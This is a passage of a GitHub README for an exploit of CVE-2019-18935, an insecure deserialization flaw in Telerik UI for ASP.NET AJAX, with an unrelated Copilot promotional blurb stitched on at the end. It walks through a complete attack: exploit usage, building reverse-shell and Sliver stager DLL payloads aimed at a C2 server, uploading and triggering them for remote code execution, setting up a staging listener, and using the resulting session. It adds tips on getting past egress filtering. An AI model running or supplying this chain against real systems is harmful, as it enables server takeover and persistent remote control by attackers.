Point [line 17](https://github.com/noperator/CVE-2019-18935/blob/master/build-dll.bat#L17) of `build-dll.bat` to the path of your Visual Studio installation.

```
set VSPATH=C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build
```

### Usage

```
$ python3 CVE-2019-18935.py -h
usage: CVE-2019-18935.py [-h] [-t] [-d] [-r FILENAME_REMOTE] [-s SMB_SERVER]
                         [-v UI_VERSION] [-n NET_VERSION] [-p PAYLOAD]
                         [-f FOLDER] -u URL

Exploit for CVE-2019-18935, a .NET JSON deserialization vulnerability in
Telerik UI for ASP.NET AJAX.

optional arguments:
  -h, --help          show this help message and exit
  -t                  just upload a file
  -d                  just deserialize
  -r FILENAME_REMOTE  remote payload name, for optional use with -d
  -s SMB_SERVER       remote SMB server, for optional use with -d
  -v UI_VERSION       software version
  -n NET_VERSION      .NET version
  -p PAYLOAD          mixed mode assembly DLL
  -f FOLDER           destination folder on target
  -u URL              https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau

```

#### Compile mixed mode .NET assembly DLL payload

Some payloads (e.g., `reverse-shell.c` and `sliver-stager.c`) require you to set the `HOST` and `PORT` fields to point to your C2 server—be sure to do that!

In a Windows environment with Visual Studio installed, use `build-dll.bat` to generate 32- and 64-bit mixed mode assembly DLLs to be used as a payload during deserialization. You may optionally specify a target CPU architecture as a second CLI argument (e.g., `x86`).

```
build-dll.bat sleep.c
```

#### Upload payload to target, and load payload into application

Pass the DLL generated above to `CVE-2019-18935.py`, which will upload the DLL to a directory on the target server (provided that the web server has write permissions in that directory) and then load that DLL into the application via the insecure deserialization exploit.

```
$ python3 CVE-2019-18935.py -v <VERSION> -p payloads/sleep-2019121205271355-x86.dll -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau
[*] Local payload name:  sleep-2019121205271355-x86.dll
[*] Destination folder:  C:\Windows\Temp
[*] Remote payload name: 1576142987.918625.dll

{'fileInfo': {'ContentLength': 75264,
              'ContentType': 'application/octet-stream',
              'DateJson': '1970-01-01T00:00:00.000Z',
              'FileName': '1576142987.918625.dll',
              'Index': 0},
 'metaData': {'AsyncUploadTypeName': 'Telerik.Web.UI.UploadedFileInfo, '
                                     'Telerik.Web.UI, Version=<VERSION>, '
                                     'Culture=neutral, '
                                     'PublicKeyToken=<TOKEN>',
              'TempFileName': '1576142987.918625.dll'}}

[*] Triggering deserialization...

<span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
<h2> <i>Runtime Error</i> </h2></span>
...omitted for brevity...

[*] Response time: 13.01 seconds

```

In the example above, the application took at least 10 seconds to respond, indicating that the DLL payload successfully invoked `Sleep(10000)`.

#### Brute-force Telerik UI version

As detailed in the DerpCon talk [.NET Roulette (39:46)](https://youtu.be/--6PiuvBGAU?t=2386), we can brute-force the Telerik UI version by specifying only the *major* version of the `Telerik.Web.UI` assembly (i.e., the `2017` portion of the full version string `2017.2.503.40`) when uploading a file. This technique drastically reduces the search space when compared to brute-forcing each specific release of this software—and, as an added benefit, it can even detect versions that aren't explicitly listed in the [release history](https://www.telerik.com/support/whats-new/aspnet-ajax/release-history) for this software. Learn more about .NET assembly versioning on [MSDN](https://docs.microsoft.com/en-us/dotnet/api/system.version#remarks).

#### Implant with Sliver C2 framework

The custom [Sliver](https://github.com/BishopFox/sliver) stager payload [`sliver-stager.c`](/noperator/CVE-2019-18935/blob/master/sliver-stager.c) receives and executes Sliver shellcode (the stage) from the Sliver server (the staging server), following Metasploit's staging protocol. For more details on how this works, read the header in the payload source.

Start Sliver server. More info on server setup [here](https://github.com/BishopFox/sliver/wiki/Getting-Started).

```
MINGW_PATH='/usr/bin'  # Or wherever MinGW is located.
export SLIVER_CC_32="$MINGW_PATH/i686-w64-mingw32-gcc"
export SLIVER_CC_64="$MINGW_PATH/x86_64-w64-mingw32-gcc"
./sliver-server
```

Open C2 endpoint (we're using an mTLS listener here, but you can also use HTTP or DNS) on Sliver server, create an implant profile, and create a staging listener linked to that profile. More info on staged payloads [here](https://github.com/BishopFox/sliver/wiki/Stagers#example). Note that we're not generating a Sliver stager using `generate stager` as Sliver's documentation suggests; we're instead using our custom [`sliver-stager.c`](/noperator/CVE-2019-18935/blob/master/sliver-stager.c).

⚠️ Warning: Sending a stage of the wrong CPU architecture will *crash* the target process! For example, if the target is running a 32-bit version of Telerik UI and the staging server sends a 64-bit stage to the 32-bit stager, the web server process will crash. In the following example, we generate 32-bit shellcode—but you must match that to your target's CPU architecture using the `new-profile` command's `--arch` flag.

```
sliver > mtls
[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > new-profile --mtls <C2-ENDPOINT>:<PORT> --arch x86 --format shellcode --profile-name shellcode-32 --skip-symbols
[*] Saved new profile shellcode-32

sliver > stage-listener --url tcp://<STAGING-SERVER>:<PORT> --profile shellcode-32
[*] No builds found for profile shellcode-32, generating a new one
[*] Job 2 (tcp) started

```

Set the host and port in the Sliver stager source to point to the Sliver server (showing an example server below).

```
sed -Ei .bu 's/<HOST>/sliverserver.bishopfox.com/; s/<PORT>/443/' sliver-stager.c

```

Compile the Sliver stager payload, and upload the payload to the target and load it into the application (all according to the preceding Usage sections in this README).

```
> .\build-dll.bat sliver-stager.c x86

$ python3 CVE-2019-18935.py -v 2017 -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -p payloads/sliver-stager-2020080514261722-x86.dll

```

If all goes well (have you [troubleshat](#Troubleshooting) this target?), you'll see a session created in your Sliver server window that you can use to interact with the target.

```
[*] Session #1 AFRAID_COMPUTER - <REMOTE-ADDRESS> (DESKTOP-D19S4Q2) - windows/386 - Wed, 05 Aug 2020 15:58:27 UTC

sliver > use 1

[*] Active session AFRAID_COMPUTER (1)

sliver (AFRAID_COMPUTER) > help

Commands:
=========
  clear  clear the screen
  exit   exit the shell
  help   use 'help [command]' for command help
  ...
  whoami             Get session user execution context

sliver (AFRAID_COMPUTER) > whoami

DESKTOP-D19S4Q2\tester

```

### Troubleshooting

* Each payload only works once—the .NET `AssemblyInstaller` class cannot load multiple .NET assemblies having the same assembly name (different from a *filename*). You'll need to compile and upload a new one each time you want the target to sleep, call back, etc.
* Ensure you're targeting the right CPU architecture (32- or 64-bit). This may take some guesswork; the sleep payload is useful here.
* Beware egress filtering rules on the target network when trying to initiate a reverse TCP connection back to your C2 server. Choose a commonly allowed TCP port, like 443.

## Accelerate performance

With GitHub Copilot embedded throughout the platform, you can simplify your toolchain, automate tasks, and improve the developer experience.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)A Copilot chat window with extensions enabled. The user inputs the @ symbol to reveal a list of five Copilot Extensions. @Sentry is selected from the list, which shifts the window to a chat directly with that extension. There are three sample prompts at the bottom of the chat window, allowing the user to Get incident information, Edit status on incident, or List the latest issues. The last one is activated to send the prompt: @Sentry List the latest issues. The extension then lists several new issues and their metadata.
